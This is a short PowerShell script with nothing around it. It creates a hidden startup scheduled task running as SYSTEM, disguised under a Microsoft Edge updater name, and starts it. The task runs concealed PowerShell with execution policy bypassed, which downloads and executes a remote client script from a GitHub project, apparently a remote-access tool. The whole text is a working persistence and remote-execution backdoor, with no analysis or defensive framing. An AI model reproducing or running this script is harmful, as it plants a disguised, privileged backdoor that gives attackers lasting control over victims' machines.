$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument " -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Command iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jxroot/ReHTTP/master/Client/client.ps1')"
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -Hidden
$user = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
Register-ScheduledTask -TaskName "MicrosoftEdgeUpdateTaskMachineUAS" -TaskPath "\" -Action $action -Settings $settings -Trigger $trigger -Principal $user
Start-ScheduledTask -TaskName "MicrosoftEdgeUpdateTaskMachineUAS" 
